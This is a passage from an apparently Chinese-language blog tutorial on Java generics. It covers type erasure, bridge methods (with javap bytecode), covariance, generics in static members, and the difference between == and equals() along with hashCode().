class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;().get(<span class="number">0</span>); <span class="comment">//返回类型就是String  </span></span><br><span class="line">    }  </span><br><span class="line"></span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure><p>通过上面的例子，我们可以明白，类型检查就是针对引用的，谁是一个引用，用这个引用调用泛型方法，就会对这个引用调用的方法进行类型检测，而无关它真正引用的对象。</p><p>泛型中参数话类型为什么不考虑继承关系？</p><p>在Java中，像下面形式的引用传递是不允许的:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;(); <span class="comment">//编译错误  </span></span><br><span class="line">ArrayList&lt;Object&gt; list2 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;(); <span class="comment">//编译错误</span></span><br><span class="line">我们先看第一种情况，将第一种情况拓展成下面的形式：</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Object&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object&gt;();  </span><br><span class="line">list1.add(<span class="keyword">new</span> <span class="title class_">Object</span>());  </span><br><span class="line">list1.add(<span class="keyword">new</span> <span class="title class_">Object</span>());  </span><br><span class="line">ArrayList&lt;String&gt; list2 = list1; <span class="comment">//编译错误</span></span><br></pre></td></tr></tbody></table></figure><p>实际上，在第4行代码的时候，就会有编译错误。那么，我们先假设它编译没错。那么当我们使用list2引用用get()方法取值的时候，返回的都是String类型的对象（上面提到了，类型检测是根据引用来决定的），可是它里面实际上已经被我们存放了Object类型的对象，这样就会有ClassCastException了。所以为了避免这种极易出现的错误，Java不允许进行这样的引用传递。（这也是泛型出现的原因，就是为了解决类型转换的问题，我们不能违背它的初衷）。</p><p>再看第二种情况，将第二种情况拓展成下面的形式：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list1 = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();  </span><br><span class="line">list1.add(<span class="keyword">new</span> <span class="title class_">String</span>());  </span><br><span class="line">list1.add(<span class="keyword">new</span> <span class="title class_">String</span>());</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Object&gt; list2 = list1; <span class="comment">//编译错误</span></span><br></pre></td></tr></tbody></table></figure><p>没错，这样的情况比第一种情况好的多，最起码，在我们用list2取值的时候不会出现ClassCastException，因为是从String转换为Object。可是，这样做有什么意义呢，泛型出现的原因，就是为了解决类型转换的问题。我们使用了泛型，到头来，还是要自己强转，违背了泛型设计的初衷。所以java不允许这么干。再说，你如果又用list2往里面add()新的对象，那么到时候取得时候，我怎么知道我取出来的到底是String类型的，还是Object类型的呢？</p><p>所以，要格外注意，泛型中的引用传递的问题。</p><h5 id="3-2-自动类型转换"><a href="#3-2-自动类型转换" class="headerlink" title="3-2.自动类型转换"></a>3-2.自动类型转换</h5><p>因为类型擦除的问题，所以所有的泛型类型变量最后都会被替换为原始类型。</p><p>既然都被替换为原始类型，那么为什么我们在获取的时候，不需要进行强制类型转换呢？</p><p>看下ArrayList.get()方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> {  </span><br><span class="line"></span><br><span class="line">    RangeCheck(index);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (E) elementData[index];  </span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到，在return之前，会根据泛型变量进行强转。假设泛型类型变量为Date，虽然泛型信息会被擦除掉，但是会将(E) elementData[index]，编译为(Date)elementData[index]。所以我们不用自己进行强转。当存取一个泛型域时也会自动插入强制类型转换。假设Pair类的value域是public的，那么表达式：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> pair.value;</span><br></pre></td></tr></tbody></table></figure><p>也会自动地在结果字节码中插入强制类型转换。</p><h5 id="3-3-类型擦除与多态的冲突和解决方法"><a href="#3-3-类型擦除与多态的冲突和解决方法" class="headerlink" title="3-3.类型擦除与多态的冲突和解决方法"></a>3-3.类型擦除与多态的冲突和解决方法</h5><p>现在有这样一个泛型类：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span>&lt;T&gt; {  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> T value;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    }  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(T value)</span> {  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后我们想要一个子类继承它。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">DateInter</span> <span class="keyword">extends</span> <span class="title class_">Pair</span>&lt;Date&gt; {  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Date value)</span> {  </span><br><span class="line">        <span class="built_in">super</span>.setValue(value);  </span><br><span class="line">    }  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getValue();  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在这个子类中，我们设定父类的泛型类型为Pair<date>，在子类中，我们覆盖了父类的两个方法，我们的原意是这样的：将父类的泛型类型限定为Date，那么父类里面的两个方法的参数都为Date类型。</date></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Date <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">    <span class="keyword">return</span> value;  </span><br><span class="line">}  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Date value)</span> {  </span><br><span class="line">    <span class="built_in">this</span>.value = value;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以，我们在子类中重写这两个方法一点问题也没有，实际上，从他们的@Override标签中也可以看到，一点问题也没有，实际上是这样的吗？</p><p>分析：实际上，类型擦除后，父类的的泛型类型全部变为了原始类型Object，所以父类编译之后会变成下面的样子：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span> {  </span><br><span class="line">    <span class="keyword">private</span> Object value;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    }  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object  value)</span> {  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    }  </span><br><span class="line">}  </span><br></pre></td></tr></tbody></table></figure><p>再看子类的两个重写的方法的类型：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Date value)</span> {  </span><br><span class="line">    <span class="built_in">super</span>.setValue(value);  </span><br><span class="line">}  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="keyword">public</span> Date <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.getValue();  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>先来分析setValue方法，父类的类型是Object，而子类的类型是Date，参数类型不一样，这如果是在普通的继承关系中，根本就不会是重写，而是重载。<br>　　<br>我们在一个main方法测试一下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException {  </span><br><span class="line">        <span class="type">DateInter</span> <span class="variable">dateInter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DateInter</span>();  </span><br><span class="line">        dateInter.setValue(<span class="keyword">new</span> <span class="title class_">Date</span>());                  </span><br><span class="line">        dateInter.setValue(<span class="keyword">new</span> <span class="title class_">Object</span>()); <span class="comment">//编译错误  </span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果是重载，那么子类中两个setValue方法，一个是参数Object类型，一个是Date类型，可是我们发现，根本就没有这样的一个子类继承自父类的Object类型参数的方法。所以说，确实是重写了，而不是重载了。</p><p>为什么会这样呢？</p><p>原因是这样的，我们传入父类的泛型类型是Date，Pair<date>，我们的本意是将泛型类变为如下：</date></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span> {  </span><br><span class="line">    <span class="keyword">private</span> Date value;  </span><br><span class="line">    <span class="keyword">public</span> Date <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">        <span class="keyword">return</span> value;  </span><br><span class="line">    }  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Date value)</span> {  </span><br><span class="line">        <span class="built_in">this</span>.value = value;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后再子类中重写参数类型为Date的那两个方法，实现继承中的多态。</p><p>可是由于种种原因，虚拟机并不能将泛型类型变为Date，只能将类型擦除掉，变为原始类型Object。这样，我们的本意是进行重写，实现多态。可是类型擦除后，只能变为了重载。这样，类型擦除就和多态有了冲突。JVM知道你的本意吗？知道！！！可是它能直接实现吗，不能！！！如果真的不能的话，那我们怎么去重写我们想要的Date类型参数的方法啊。</p><p>于是JVM采用了一个特殊的方法，来完成这项功能，那就是桥方法。</p><p>首先，我们用javap -c className的方式反编译下DateInter子类的字节码，结果如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.tao.test.DateInter <span class="keyword">extends</span> <span class="title class_">com</span>.tao.test.Pair&lt;java.util.Date&gt; {  </span><br><span class="line">  com.tao.test.DateInter();  </span><br><span class="line">    Code:  </span><br><span class="line">       <span class="number">0</span>: aload_0  </span><br><span class="line">       <span class="number">1</span>: invokespecial #<span class="number">8</span>                  <span class="comment">// Method com/tao/test/Pair."&lt;init&gt;":()V  </span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span>  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(java.util.Date)</span>;  <span class="comment">//我们重写的setValue方法  </span></span><br><span class="line">    Code:  </span><br><span class="line">       <span class="number">0</span>: aload_0  </span><br><span class="line">       <span class="number">1</span>: aload_1  </span><br><span class="line">       <span class="number">2</span>: invokespecial #<span class="number">16</span>                 <span class="comment">// Method com/tao/test/Pair.setValue:(Ljava/lang/Object;)V  </span></span><br><span class="line">       <span class="number">5</span>: <span class="keyword">return</span>  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.util.Date <span class="title function_">getValue</span><span class="params">()</span>;    <span class="comment">//我们重写的getValue方法  </span></span><br><span class="line">    Code:  </span><br><span class="line">       <span class="number">0</span>: aload_0  </span><br><span class="line">       <span class="number">1</span>: invokespecial #<span class="number">23</span>                 <span class="comment">// Method com/tao/test/Pair.getValue:()Ljava/lang/Object;  </span></span><br><span class="line">       <span class="number">4</span>: checkcast     #<span class="number">26</span>                 <span class="comment">// class java/util/Date  </span></span><br><span class="line">       <span class="number">7</span>: areturn  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> java.lang.Object <span class="title function_">getValue</span><span class="params">()</span>;     <span class="comment">//编译时由编译器生成的巧方法  </span></span><br><span class="line">    Code:  </span><br><span class="line">       <span class="number">0</span>: aload_0  </span><br><span class="line">       <span class="number">1</span>: invokevirtual #<span class="number">28</span>                 <span class="comment">// Method getValue:()Ljava/util/Date 去调用我们重写的getValue方法;  </span></span><br><span class="line">       <span class="number">4</span>: areturn  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(java.lang.Object)</span>;   <span class="comment">//编译时由编译器生成的巧方法  </span></span><br><span class="line">    Code:  </span><br><span class="line">       <span class="number">0</span>: aload_0  </span><br><span class="line">       <span class="number">1</span>: aload_1  </span><br><span class="line">       <span class="number">2</span>: checkcast     #<span class="number">26</span>                 <span class="comment">// class java/util/Date  </span></span><br><span class="line">       <span class="number">5</span>: invokevirtual #<span class="number">30</span>                 <span class="comment">// Method setValue:(Ljava/util/Date; 去调用我们重写的setValue方法)V  </span></span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span>  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从编译的结果来看，我们本意重写setValue和getValue方法的子类，竟然有4个方法，其实不用惊奇，最后的两个方法，就是编译器自己生成的桥方法。可以看到桥方法的参数类型都是Object，也就是说，子类中真正覆盖父类两个方法的就是这两个我们看不到的桥方法。而打在我们自己定义的setvalue和getValue方法上面的@Oveerride只不过是假象。而桥方法的内部实现，就只是去调用我们自己重写的那两个方法。</p><p>所以，虚拟机巧妙的使用了桥方法，来解决了类型擦除和多态的冲突。</p><p>不过，要提到一点，这里面的setValue和getValue这两个桥方法的意义又有不同。</p><p>setValue方法是为了解决类型擦除与多态之间的冲突。</p><p>而getValue却有普遍的意义，怎么说呢，如果这是一个普通的继承关系：</p><p>那么父类的setValue方法如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectgetValue</span><span class="params">()</span> {  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.getValue();  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>而子类重写的方法是：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Date <span class="title function_">getValue</span><span class="params">()</span> {  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.getValue();  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>其实这在普通的类继承中也是普遍存在的重写，这就是协变。<br><a href="https://extremegtr.github.io/2016/07/11/Covariance-And-Contravariance-In-Java/">https://extremegtr.github.io/2016/07/11/Covariance-And-Contravariance-In-Java/</a></p><blockquote><p>协变 / 共变（covariance）指的是子类型关系在类型变换的作用下保持原样。<br>不可变（invariance） 表示子类型关系在类型变换的作用下，既没有协变的效果，也没有逆变的效果。<br>逆变 / 反变（contravariance）指的是子类型关系在类型变换的作用下发生逆转。<br>双变（bivariance）表示子类型关系在类型变换的作用下同时拥有协变与逆变2种效果。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/cn/posts/53914/20200806151224399.png" alt="在这里插入图片描述"><br>Java支持协变数组，你可能会问Java支持逆变数组吗？答案是：Java不支持逆变数组。<br><a href="https://codingnote.com/2020/03/08/java-covariant-contravariant-invariant/">https://codingnote.com/2020/03/08/java-covariant-contravariant-invariant/</a><br><a href="https://extremegtr.github.io/2016/05/30/JavaSE-study-advanced-generics/#u901A_u914D_u7B26_uFF08Wildcard_uFF09">https://extremegtr.github.io/2016/05/30/JavaSE-study-advanced-generics/#u901A_u914D_u7B26_uFF08Wildcard_uFF09</a><br>Java下限通配符实现逆变<br>由于Java泛型的不可变性，generateIntegers() 生成的List<integer>不能放到输入参数output指定的List<number>中。那么有没有办法把 List<integer> 放到List<number>中呢？<br>答案是使用下限通配符来实现逆变。<br>正如大家所熟知的一个概念：在Java中，所有类型的父类型都是Object类型，方法的形参类型是Object，那这个方法就能接受任何类型的参数传递进来。这个推论正是实现该需求的关键所在。<br>根据上面的推导，我们可能会这么认为：既然Object是所有类型的父类型，那么List<object>肯定是所有List参数化类型的父类型。但事实却不是这样的，即2个类型实参之间具有子类型关系，但使用它们对同一泛型进行参数化后的类型并没有保持这种子类型关系。与上文描述一致。<br>List<object>表示的只是它能够存储任意元素类型，而并没有表示它是所有参数化类型的父类型。所以这种解决方案是完全行不通的。</object></object></number></integer></number></integer></p></blockquote><p>并且，还有一点也许会有疑问，子类中的桥方法Object getValue()和Date getValue()是同 时存在的，可是如果是常规的两个方法，他们的方法签名是一样的，也就是说虚拟机根本不能分别这两个方法。如果是我们自己编写Java代码，这样的代码是无法通过编译器的检查的，但是虚拟机却是允许这样做的，因为虚拟机通过参数类型和返回类型来确定一个方法，所以编译器为了实现泛型的多态允许自己做这个看起来“不合法”的事情，然后交给虚拟器去区别。</p><p>总结：</p><p>   在Java中，数组具有协变性，简单点来说就是子类型数组可以赋值给父类型数组进行使用，比如将Integer数组赋值给Object数组，这样来使用数组不会有警告甚至报错，但会存在运行时出错的风险，所以数组的协变性是具有瑕疵的，虽然它能这么用，但我们必须为此而承受一定风险。</p><p>Java泛型就不可以做出像数组这样的行为，因为泛型没有内建的协变类型，Java泛型具有不可变性（不具备协变性和逆变性）。但是，为了兼容遗留代码而被保留下来的原生类型确实可以做出这样的行为，但同时我们也非常清楚使用它就像使用数组的协变性一样意味着代码变得不再安全。</p><p>　　所以，制定Java标准的那群人想出了个法子使得泛型像数组一样具有这些特性，同时这种代替原生类型的方案必须是绝对安全的：他们通过给泛型增加通配符特性使得泛型在参数化后具有协变性或逆变性。</p><h5 id="3-4-泛型类型变量不能是基本数据类型"><a href="#3-4-泛型类型变量不能是基本数据类型" class="headerlink" title="3-4.泛型类型变量不能是基本数据类型"></a>3-4.泛型类型变量不能是基本数据类型</h5><p>不能用类型参数替换基本类型。就比如，没有ArrayList<double>，只有ArrayList<double>。因为当类型擦除后，ArrayList的原始类型变为Object，但是Object类型不能存储double值，只能引用Double的值。</double></double></p><h5 id="3-5-编译时集合的instanceof"><a href="#3-5-编译时集合的instanceof" class="headerlink" title="3-5.编译时集合的instanceof"></a>3-5.编译时集合的instanceof</h5><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br></pre></td></tr></tbody></table></figure><p>因为类型擦除之后，ArrayList<string>只剩下原始类型，泛型信息String不存在了。</string></p><p>那么，编译时进行类型查询的时候使用下面的方法是错误的</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( arrayList <span class="keyword">instanceof</span> ArrayList&lt;String&gt;)</span><br></pre></td></tr></tbody></table></figure><h5 id="3-6-泛型在静态方法和静态类中的问题"><a href="#3-6-泛型在静态方法和静态类中的问题" class="headerlink" title="3-6.泛型在静态方法和静态类中的问题"></a>3-6.泛型在静态方法和静态类中的问题</h5><p>泛型类中的静态方法和静态变量不可以使用泛型类所声明的泛型类型参数</p><p>举例说明：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span>&lt;T&gt; {    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> T one;   <span class="comment">//编译错误    </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  T <span class="title function_">show</span><span class="params">(T one)</span>{ <span class="comment">//编译错误    </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;    </span><br><span class="line">    }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因为泛型类中的泛型参数的实例化是在定义对象的时候指定的，而静态变量和静态方法不需要使用对象来调用。对象都没有创建，如何确定这个泛型参数是何种类型，所以当然是错误的。</p><p>但是要注意区分下面的一种情况：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span>&lt;T&gt; {    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T &gt;T <span class="title function_">show</span><span class="params">(T one)</span>{ <span class="comment">//这是正确的    </span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;    </span><br><span class="line">    }    </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>因为这是一个泛型方法，在泛型方法中使用的T是自己在方法中定义的 T，而不是泛型类中的T。</p><p>==和equals的区别</p><p>== : 它的作用是判断两个对象的地址是不是相等。即判断两个对象是不是同一个对象。(基本数据类型==比较的是值，引用数据类型==比较的是内存地址)<br>equals() 方法存在两种使用情况：</p><ul><li><p>情况 1：类没有覆盖 equals()方法。则通过equals()比较该类的两个对象时，等价于通过“==”比较这两个对象。使用的默认是 Object类equals()方法。</p></li><li><p>情况 2：类覆盖了 equals()方法。一般，我们都覆盖 equals()方法来两个对象的内容相等；若它们的内容相等，则返回 true(即，认为这两个对象相等)。</p></li><li><p>String 中的 equals 方法是被重写过的，因为 Object 的 equals 方法是比较的对象的内存地址，而 String 的 equals 方法比较的是对象的值。</p></li><li><p>当创建 String 类型的对象时，虚拟机会在常量池中查找有没有已经存在的值和要创建的值相同的对象，如果有就把它赋给当前引用。如果没有就在常量池中重新创建一个 String 对象。</p></li></ul><h2 id="hashCode-与-equals"><a href="#hashCode-与-equals" class="headerlink" title="hashCode()与 equals()"></a>hashCode()与 equals()</h2><h3 id="hashCode-介绍"><a href="#hashCode-介绍" class="headerlink" title="hashCode()介绍:"></a>hashCode()介绍:</h3><p>hashCode() 的作用是获取哈希码，也称为散列码；它实际上是返回一个 int 整数。这个哈希码的作用是确定该对象在哈希表中的索引位置。hashCode()定义在 JDK 的 Object 类中，这就意味着 Java 中的任何类都包含有 hashCode() 函数。另外需要注意的是： Object 的 hashcode 方法是本地方法，也就是用 c 语言或 c++ 实现的，该方法通常用来将对象的 内存地址 转换为整数之后返回。</p><blockquote><p>散列表存储的是键值对(key-value)，它的特点是：能根据“键”快速的检索出对应的“值”。这其中就利用到了散列码！（可以快速找到所需要的对象）</p></blockquote><h3 id="为什么要有-hashCode？"><a href="#为什么要有-hashCode？" class="headerlink" title="为什么要有 hashCode？"></a>为什么要有 hashCode？</h3><p>我们以“HashSet 如何检查重复”为例子来说明为什么要有 hashCode？</p><p>当你把对象加入 HashSet 时，HashSet 会先计算对象的 hashcode 值来判断对象加入的位置，同时也会与其他已经加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用 equals（）方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让其加入操作成功。如果不同的话，就会重新散列到其他位置。（Head fist java》第二版）。这样我们就大大减少了 equals 的次数，相应就大大提高了执行速度。</p><p>为什么重写 equals 时必须重写 hashCode 方法？</p><p>如果两个对象相等，则 hashcode 一定也是相同的。两个对象相等,对两个对象分别调用 equals 方法都返回 true。但是，两个对象有相同的 hashcode 值，它们也不一定是相等的 。因此，equals 方法被覆盖过，则 hashCode 方法也必须被覆盖。</p><blockquote><p>hashCode()的默认行为是对堆上的对象产生独特值。如果没有重写 hashCode()，则该 class 的两个对象无论如何都不会相等（即使这两个对象指向相同的数据）</p></blockquote><p>String类对hashcode的重写</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns a hash code for this string. The hash code for a</span></span><br><span class="line"><span class="comment"> * {<span class="doctag">@code</span> String} object is computed as</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;&lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * s[0]*31^(n-1) + s[1]*31^(n-2) + ... + s[n-1]</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * using {<span class="doctag">@code</span> int} arithmetic, where {<span class="doctag">@code</span> s[i]} is the</span></span><br><span class="line"><span class="comment"> * &lt;i&gt;i&lt;/i&gt;th character of the string, {<span class="doctag">@code</span> n} is the length of</span></span><br><span class="line"><span class="comment"> * the string, and {<span class="doctag">@code</span> ^} indicates exponentiation.</span></span><br><span class="line"><span class="comment"> * (The hash value of the empty string is zero.)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>  a hash code value for this object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> {</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> 